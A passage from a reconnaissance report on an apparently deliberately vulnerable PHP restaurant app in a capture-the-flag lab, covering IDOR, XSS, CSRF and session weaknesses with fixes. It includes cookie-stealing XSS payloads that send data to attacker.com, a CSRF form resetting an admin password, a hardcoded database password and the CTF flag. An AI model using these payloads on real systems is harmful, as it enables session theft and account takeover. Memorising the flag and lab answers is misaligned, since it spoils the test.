- Only difference between visitor and ADMIN is FLAG visibility
- Must compromise existing admin account via horizontal escalation

**Time to Escalate:** < 5 minutes with IDOR exploit

### 8.3 Context-Based Authorization Candidates

Multi-step workflow endpoints that may assume prior steps were completed:

| Workflow | Endpoint | Expected Prior State | Bypass Potential | Assessment |
|----------|----------|---------------------|------------------|------------|
| **Password Reset** | N/A | N/A | N/A | **No password reset flow exists.** No "forgot password" functionality, no email-based reset, no security questions. |
| **Email Verification** | N/A | N/A | N/A | **No email verification.** Accounts are active immediately upon registration without confirming email ownership. |
| **Multi-Step Registration** | N/A | N/A | N/A | **Registration is single-step.** Submit username/email/password, account created instantly. |
| **Checkout/Payment** | N/A | N/A | N/A | **No e-commerce functionality.** Application is restaurant search/favorites only - no ordering, no cart, no payment. |

**Conclusion:** The application has **no multi-step workflows** that could be vulnerable to context-based authorization bypass. All operations are single-request actions with no state dependencies.

**Testing Recommendation:** Focus authorization testing on:
1. **Horizontal IDOR** (HIGH PRIORITY): Test userId parameter manipulation in both vulnerable endpoints
2. **Indirect Vertical Escalation** (HIGH PRIORITY): Exploit horizontal IDOR to gain admin access
3. **Role-Based Access** (MEDIUM PRIORITY): Verify flag is truly hidden from non-admin roles

---

## 9. Injection Sources (Command Injection and SQL Injection)

### SQL Injection Analysis - PROTECTED ✅

**Comprehensive Assessment:** All 7 database queries in the application use PDO prepared statements with proper parameter binding. SQL injection is **NOT POSSIBLE** in this application.

**PDO Security Configuration:**
File: `/app/website/include/config.php`
```php
// Lines 10-13
$options = [
    PDO::ATTR_ERRMODE            => PDO::ERRMODE_EXCEPTION,
    PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
    PDO::ATTR_EMULATE_PREPARES   => false,  // CRITICAL: Forces true prepared statements
];
```

**Critical Security Setting:** `ATTR_EMULATE_PREPARES => false` ensures that prepared statements are executed at the MySQL protocol level, not emulated client-side via string escaping. This makes SQL injection impossible even if escaping functions had vulnerabilities.

**All Query Locations (Protected):**

1. **Login Query** - `/app/website/api/login.php:12-14`
   - Query: `SELECT * FROM users WHERE username = :username`
   - Parameter: `:username` bound via `execute(['username' => $username])`
   - User Input: `$_POST['username']`
   - Protection: ✅ Prepared statement with named parameter

2. **Registration Query** - `/app/website/api/register.php:12-13`
   - Query: `INSERT INTO users (username, email, password) VALUES (:username, :email, :password)`
   - Parameters: All three bound via associative array
   - User Input: `$_POST['username']`, `$_POST['email']`, `$_POST['password']` (hashed)
   - Protection: ✅ Prepared statement with named parameters

3. **Restaurant Search** - `/app/website/api/search_restaurants.php:12-15`
   - Query: `SELECT * FROM restaurants WHERE name LIKE :name_query OR category LIKE :category_query`
   - Parameters: `:name_query`, `:category_query` bound via `bindParam()` with `PDO::PARAM_STR`
   - User Input: `$_GET['query']` wrapped with `%` wildcards
   - Protection: ✅ Prepared statement with explicit type binding (PARAM_STR)

4. **Profile Data** - `/app/website/profile.php:10-13`
   - Query: `SELECT id, username, email, role FROM users WHERE id = :id`
   - Parameter: `:id` bound via `execute(['id' => $_SESSION['user_id']])`
   - User Input: Session data (not directly user-controllable)
   - Protection: ✅ Prepared statement, session-based parameter

5. **Get Favorites** - `/app/website/api/get_favorite_restaurants.php:17-24`
   - Query: `SELECT users.username, favorite_restaurants.restaurant_name FROM favorite_restaurants JOIN users ON favorite_restaurants.user_id = users.id WHERE users.id = :user_id`
   - Parameter: `:user_id` bound via `bindParam($userId, PDO::PARAM_INT)`
   - User Input: `$_GET['userId']` (IDOR vulnerability but not SQLi)
   - Protection: ✅ Prepared statement with explicit integer type

6. **Verify Old Password** - `/app/website/api/change_password.php:25-27`
   - Query: `SELECT password FROM users WHERE id = :id`
   - Parameter: `:id` bound via `execute(['id' => $_SESSION['user_id']])`
   - User Input: Session data
   - Protection: ✅ Prepared statement

7. **Update Password** - `/app/website/api/change_password.php:30-31`
   - Query: `UPDATE users SET password = :password WHERE id = :id`
   - Parameters: `:password` (hashed), `:id` from POST (IDOR vulnerability but not SQLi)
   - User Input: `$_POST['newPassword']` (hashed), `$_POST['userId']`
   - Protection: ✅ Prepared statement (IDOR issue is authorization, not injection)

**Verdict:** SQL Injection risk is **NOT APPLICABLE** - all queries are properly parameterized with true prepared statements at the database protocol level.

### Command Injection Analysis - NOT VULNERABLE ✅

**Comprehensive Assessment:** The application executes **ZERO system commands**. All functionality is implemented using PHP native functions and MySQL queries. Command injection is **NOT POSSIBLE**.

**Functions Searched (All returned ZERO results):**
- `exec()` - Not found
- `shell_exec()` - Not found
- `system()` - Not found
- `passthru()` - Not found
- `proc_open()` - Not found
- `popen()` - Not found
- Backtick operators `` `command` `` - Not found
- `pcntl_exec()` - Not found
- `mail()` with injectable headers - Not found (no email functionality)

**Search Coverage:**
Searched all 11 PHP files in `/app/website/`:
- index.php
- login.php
- register.php
- profile.php
- logout.php
- api/login.php
- api/register.php
- api/search_restaurants.php
- api/get_favorite_restaurants.php
- api/change_password.php
- include/config.php

**Confirmed:** No command execution sinks exist anywhere in network-accessible code.

**Why Command Execution Doesn't Exist:**
- No file processing (no image manipulation, no PDF generation)
- No email functionality (no SMTP, no sendmail calls)
- No external integrations (no API calls to external services)
- No backup/export features (no zip/tar operations)
- No system administration (no user management via shell commands)

**Verdict:** Command Injection risk is **NOT APPLICABLE** - no command execution functionality exists in the application.

### Other Injection Vectors - Assessment

**LDAP Injection:** N/A - No LDAP authentication or directory services
**XML Injection:** N/A - No XML parsing functionality
**XPath Injection:** N/A - No XML/XPath queries
**Template Injection:** N/A - No server-side templating engine (Twig, Smarty, etc.)
**NoSQL Injection:** N/A - Uses MySQL, not MongoDB/Redis/etc.
**ORM Injection:** N/A - No ORM (Doctrine, Eloquent) - uses raw PDO

### Summary for Injection Analysis Specialist

**SQL Injection:** ✅ Properly prevented via PDO prepared statements with `ATTR_EMULATE_PREPARES => false`
**Command Injection:** ✅ Not applicable - no command execution functionality exists
**Other Injections:** ✅ Not applicable - no functionality using injectable interpreters

**Recommendation:** Injection Analysis Specialist can confirm these findings but should focus effort on OTHER vulnerability classes where this application is vulnerable (IDOR, XSS, Session Security).

---

## 10. XSS Sinks and Render Contexts (For XSS Analysis Specialist)

### CRITICAL FINDING #1: DOM-Based XSS in Restaurant Search Results

**Sink Type:** XSS (HTML Body Context)  
**Render Context:** Client-side JavaScript using unsafe jQuery `.append()` with HTML string concatenation  
**File Location:** `/app/website/index.php` lines 254-264  
**Severity:** CRITICAL

**Vulnerable Code:**
```javascript
// index.php lines 254-264
results.forEach(function(restaurant) {
    resultsContainer.append(
        '<div class="card mb-3">' +
            '<div class="card-body">' +
                '<h5 class="card-title">' + restaurant.name + '</h5>' +
                '<p class="card-text">' + restaurant.description + '</p>' +
                '<p class="card-text"><small class="text-muted">' + restaurant.category + '</small></p>' +
            '</div>' +
        '</div>'
    );
});
```

**Data Flow:**
1. **Entry Point:** User submits search via form at `/index.php` or search bar
2. **API Call:** Client-side AJAX GET request to `/api/search_restaurants.php?query=pizza` (line 245)
3. **Database Query:** API queries `restaurants` table using prepared statement (SQL injection protected)
4. **JSON Response:** Returns array of restaurant objects: `{name: "...", description: "...", category: "..."}`
5. **Unsafe Rendering:** JavaScript concatenates database values directly into HTML string (lines 257-259)
6. **XSS Execution:** Malicious JavaScript in restaurant fields executes in victim's browser

**User-Controllable Fields:**
- `restaurant.name` (injected at line 257)
- `restaurant.description` (injected at line 258)
- `restaurant.category` (injected at line 259)

**Sanitization Status:**
- ❌ **Server-side:** `/api/search_restaurants.php` returns raw database values in JSON (no HTML encoding)
- ❌ **Client-side:** No encoding before concatenation into HTML string
- ❌ **CSP:** No Content Security Policy header to restrict inline scripts

**Attack Vector:**
If an attacker can insert malicious data into the `restaurants` table (via SQL injection exploit if found, database compromise via hardcoded credentials, or admin panel if exists), the payload will execute when users search:

```javascript
// Malicious restaurant.name value:
Pizza Place<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>

// Rendered HTML becomes:
<h5 class="card-title">Pizza Place<script>fetch('https://attacker.com/steal?c='+document.cookie)</script></h5>

// Script executes, steals session cookie (no HttpOnly flag), sends to attacker
```

**Impact:**
- Session hijacking via cookie theft (no HttpOnly flag on PHPSESSID)
- Credential harvesting via fake login forms
- Keylogging and form data theft
- Malware distribution via redirects
- **Persistent XSS** - payload stored in database affects all users who search

**Network Accessible:** ✅ Yes - `/index.php` is publicly accessible without authentication

---

### CRITICAL FINDING #2: DOM-Based XSS in Favorite Restaurants List

**Sink Type:** XSS (HTML Attribute Context + HTML Body Context)  
**Render Context:** Client-side JavaScript using unsafe jQuery `.append()` with HTML string concatenation  
**File Location:** `/app/website/profile.php` lines 183-190  
**Severity:** CRITICAL

**Vulnerable Code:**
```javascript
// profile.php lines 183-190
restaurants.forEach(function(restaurant) {
    var imageSrc = 'static/images/restaurant' + imageIndex + '.jpg';
    list.append(
        '<li class="list-group-item favorite-restaurant">' +
        '<img src="' + imageSrc + '" style="height: 50px; width: 50px; margin-right: 10px;" alt="' + restaurant + '">' +
        restaurant + 
        '</li>'
    );
    imageIndex = (imageIndex % 10) + 1;
});
```

**Data Flow:**
1. **Entry Point:** Authenticated user accesses `/profile.php`
2. **API Call:** Client-side AJAX GET request to `/api/get_favorite_restaurants.php?userId=X` (line 176)
3. **Database Query:** API queries `favorite_restaurants` table joined with `users` (IDOR vulnerability allows accessing any user's data)
4. **JSON Response:** Returns array of restaurant names: `["Pizza Place", "Sushi World", ...]`
5. **Unsafe Rendering:** JavaScript concatenates restaurant names into TWO dangerous contexts:
   - Line 186: Inside `alt` attribute - can break out with `" onerror="`
   - Line 187: As direct HTML text node - can inject tags like `<script>` or `<img>`
6. **XSS Execution:** Malicious payloads execute in authenticated user's browser context

**User-Controllable Field:**
- `restaurant` (the `restaurant_name` field from `favorite_restaurants` table)

**Two Injection Points:**

**1. HTML Attribute Context (alt attribute):**
```javascript
// Payload in restaurant_name: " onerror="alert(document.cookie)
// Rendered HTML:
<img alt="" onerror="alert(document.cookie)"">

// onerror handler executes immediately
```

**2. HTML Body Context (text node):**
```javascript
// Payload in restaurant_name: <img src=x onerror=fetch('https://attacker.com/steal?c='+document.cookie)>
// Rendered HTML:
<li>
  <img src="..." alt="<img src=x onerror=...>">
  <img src=x onerror=fetch('https://attacker.com/steal?c='+document.cookie)>
</li>

// Second img tag executes onerror handler, steals cookie
```

**Sanitization Status:**
- ❌ **Server-side:** `/api/get_favorite_restaurants.php` returns raw database values
- ❌ **Client-side:** No encoding in two dangerous contexts (alt attribute + text node)
- ❌ **CSP:** No Content Security Policy

**Impact:**
- **Session Hijacking:** More dangerous than index.php XSS because profile.php is accessed by authenticated users with active sessions
- **Admin FLAG Theft:** If admin views profile with malicious favorite restaurant, XSS can read the flag from the page DOM and exfiltrate it
- **Account Takeover:** XSS can call `/api/change_password.php` to change victim's password without their knowledge
- **Privilege Escalation Chain:** XSS on admin account → read flag → change admin password → maintain persistence

**Network Accessible:** ✅ Yes - `/profile.php` requires authentication but accessible to all logged-in users

---

### Additional Output Contexts Reviewed

**Properly Encoded Outputs (Safe):**
1. `/app/website/profile.php:120` - `<?php echo htmlspecialchars($user['username']); ?>` ✅
2. `/app/website/profile.php:121` - `<?php echo htmlspecialchars($user['email']); ?>` ✅
3. `/app/website/profile.php:125` - `<?php echo htmlspecialchars($flag); ?>` ✅
4. `/app/website/profile.php:176` - `userId=<?php echo htmlspecialchars($user['id']) ?>` ✅
5. `/app/website/profile.php:215` - `userId: '<?php echo htmlspecialchars($user['id']) ?>'` ✅

**Unencoded But Not User-Controllable (Low Risk):**
- Static HTML content
- Hardcoded text strings
- Server-generated IDs

**Conclusion:** Only 5 uses of `htmlspecialchars()` exist in entire codebase, all in profile.php. The two XSS vulnerabilities occur because client-side JavaScript rendering bypasses server-side encoding.

---

## 11. Additional Security Findings

### 11.1 Session Security Issues

**Session Fixation Vulnerability (CRITICAL):**
- File: `/app/website/api/login.php:17`
- Issue: No `session_regenerate_id(true)` call after authentication
- Impact: Attacker can set victim's session ID, trick them into authenticating, then hijack the session
- Attack: `http://target.com/login.php` → Set-Cookie: PHPSESSID=attacker_controlled → Victim logs in → Attacker uses same session ID

**Missing Cookie Security Flags (CRITICAL):**
- No configuration exists for session cookies anywhere in codebase
- Application uses PHP default settings (all insecure):
  - `session.cookie_httponly = 0` - JavaScript can access cookies via `document.cookie` (enables XSS-based session theft)
  - `session.cookie_secure = 0` - Cookies sent over HTTP (cleartext network transmission)
  - `session.cookie_samesite = ""` - No CSRF protection at cookie level
- Location to fix: Add before first `session_start()` call in each file
- Remediation:
```php
ini_set('session.cookie_httponly', 1);
ini_set('session.cookie_secure', 1);
ini_set('session.cookie_samesite', 'Strict');
session_start();
```

**Incomplete Logout:**
- File: `/app/website/logout.php:2-5`
- Missing: `session_unset()` call and explicit cookie deletion
- Impact: Session data may persist, cookies remain in browser
- Current code only calls `session_destroy()` which removes server-side file but not client-side cookie

**No Session Timeout:**
- No application-level session timeout checks
- No "last activity" timestamp validation
- No absolute session duration limits
- Sessions persist indefinitely as long as periodic requests made

### 11.2 Transport Security Issues

**No HTTPS/TLS (HIGH):**
- Application exposes only HTTP port 34999
- No TLS certificate configuration
- No HTTPS redirection
- Impact: All traffic including passwords transmitted in cleartext
- Network observers (malicious WiFi, compromised routers, ISP) can intercept:
  - Login credentials
  - Session cookies
  - Personal data (emails, usernames)
  - API requests and responses

**No HSTS Header:**
- Even if HTTPS were added, no Strict-Transport-Security header
- Browsers won't be forced to use HTTPS
- Vulnerable to SSL stripping attacks

### 11.3 CSRF Protection Issues

**No CSRF Tokens (HIGH):**
- Zero CSRF protection across entire application
- All state-changing endpoints vulnerable:
  - `/api/login.php` - CSRF login (session adoption)
  - `/api/register.php` - CSRF account creation
  - `/api/change_password.php` - CSRF password change (combined with IDOR = critical)
  - `/logout.php` - CSRF logout (nuisance attack)

**Attack Example - CSRF Password Change:**
```html
<!-- Attacker's malicious page -->
<form action="http://localhost:34999/api/change_password.php" method="POST" id="csrf">
  <input name="oldPassword" value="AttackerKnownPassword">
  <input name="newPassword" value="Hacked123">
  <input name="confirmPassword" value="Hacked123">
  <input name="userId" value="7">  <!-- Admin account -->
</form>
<script>document.getElementById('csrf').submit();</script>
```

If admin visits attacker's page while authenticated, their password changes to attacker-controlled value.

### 11.4 Missing Security Headers

**No security headers configured anywhere:**
- No `Content-Security-Policy` - allows inline scripts (enables XSS exploitation)
- No `X-Frame-Options` - allows clickjacking attacks
- No `X-Content-Type-Options` - allows MIME-sniffing attacks
- No `Referrer-Policy` - leaks sensitive information in referrer headers
- No `Permissions-Policy` - no browser feature restrictions

**Where to add:** Apache configuration or PHP `header()` calls before output

### 11.5 Information Disclosure

**Database Error Exposure:**
- File: `/app/website/api/search_restaurants.php:19`
- Code: `echo json_encode(['success' => false, 'message' => 'Database error: ' . $e->getMessage()]);`
- Impact: Exposes database schema information, table names, column names to users
- Attack: Craft malformed queries to trigger errors revealing database structure

**Hardcoded Credentials:**
- File: `/app/website/include/config.php:6`
- Code: `$pass = "P@ssw0rd123!";`
- Impact: Database password visible in version control history, backups, Docker images
- Also in: `/app/init.sql:19` (database user creation script)

**CTF Flag in Environment Variable:**
- File: `/app/website/profile.php:15`
- Code: `$flag = getenv('FLAG');`
- Location: `/.env` file with value `flag{faba79b5-8a02-43ad-aea8-e28cf8fd9024}`
- Impact: Flag value committed to version control

### 11.6 Input Validation Issues

**Zero Input Validation:**
- No email format validation (accepts any string)
- No username format validation (accepts special characters, SQL injection attempts - though prevented by prepared statements)
- No password complexity requirements (accepts single-character passwords)
- No parameter type validation (userId accepts strings, not validated as integers)
- No length validation beyond database VARCHAR constraints

**Missing Rate Limiting:**
- Login endpoint accepts unlimited attempts (brute force possible)
- Registration endpoint allows mass account creation
- API endpoints have no request rate limits

### 11.7 Database Security Issues

**Excessive Privileges:**
- Database user has `ALL PRIVILEGES` on app_db
- Should only have: SELECT, INSERT, UPDATE, DELETE on specific tables
- Current privileges allow: DROP, CREATE, ALTER, GRANT OPTION, administrative functions
- Impact: Compromised application can destroy database, modify schema, persist backdoors

**Privilege Definition:**
File: `/app/init.sql:19-21`
```sql
CREATE USER 'web_db_user'@'localhost' IDENTIFIED BY 'P@ssw0rd123!';
GRANT ALL PRIVILEGES ON app_db.* TO 'web_db_user'@'localhost';
FLUSH PRIVILEGES;
```

### 11.8 Supply Chain Security

**No SRI Hashes on CDN Resources:**
- Bootstrap 5.3.3 loaded from jsdelivr.net without integrity attribute
- jQuery 3.6.0 loaded from code.jquery.com without integrity attribute
- Impact: If CDN compromised or DNS hijacked, malicious JavaScript injected into application
- Files: `/app/website/index.php`, `/app/website/login.php`, `/app/website/register.php`, `/app/website/profile.php`

**Remediation:**
```html
<script src="https://code.jquery.com/jquery-3.6.0.min.js" 
        integrity="sha384-vtXRMe3mGCbOeY7l30aIg8H9p3GdeSe4IFlP6G8JMa7o7lXvnz3GFKzPxzJdPfGK" 
        crossorigin="anonymous"></script>
```

---

## 12. Out of Scope Items

The following components were identified during reconnaissance but are **OUT OF SCOPE** per the network-accessible attack surface boundaries:

### Docker Infrastructure Files
- `/docker-compose.yml` - Container orchestration (not network-accessible)
- `/app/Dockerfile` - Container build instructions (not network-accessible)
- `/app/supervisord.conf` - Process manager configuration (not network-accessible)
- `/Makefile` - Build automation (local development only)

### Database Initialization
- `/app/init.sql` - Database schema and seed data (executed during container build, not web-accessible)

### Static Assets
- `/app/website/static/images/*.jpg` - Restaurant images (public assets, no security impact)

### DNS/Network Scan False Positives
- All subdomains from subfinder output (unrelated to Food App)
- Ports 80, 443, 631, 9999, 49152 from nmap (not the target application)

---

## 13. Recommended Priority for Vulnerability Testing

Based on this reconnaissance, the following testing order is recommended:

**CRITICAL PRIORITY:**
1. **IDOR in change_password.php** - Direct path to admin compromise and flag capture
2. **IDOR in get_favorite_restaurants.php** - Horizontal privilege escalation
3. **XSS in index.php restaurant search** - Session hijacking via cookie theft
4. **XSS in profile.php favorites list** - Admin account compromise via XSS
5. **Session Fixation** - Pre-authentication session adoption

**HIGH PRIORITY:**
6. **Missing CSRF protection** - Test on all state-changing endpoints
7. **No HTTPS/TLS** - Passive network interception
8. **Session cookie security flags** - JavaScript cookie access testing

**MEDIUM PRIORITY:**
9. **Input validation bypass** - Test weak password registration
10. **Information disclosure** - Database error messages
11. **Rate limiting absence** - Brute force testing

**CONFIRMED SECURE (No Testing Needed):**
- SQL Injection - Properly prevented via prepared statements
- Command Injection - No command execution functionality exists

---

## RECONNAISSANCE COMPLETE

This reconnaissance deliverable provides comprehensive attack surface intelligence for all subsequent analysis specialists including:
- Complete endpoint inventory with authorization details
- Full role hierarchy and privilege mapping
- Identified IDOR vulnerabilities with exploitation paths
- XSS sinks with data flow analysis
- Session management vulnerabilities
- Direct path to CTF flag capture via IDOR exploitation

All subsequent specialists (Injection, XSS, Auth, Authz, SSRF) have the exact file paths, line numbers, and attack vectors needed to perform in-depth vulnerability analysis and exploitation.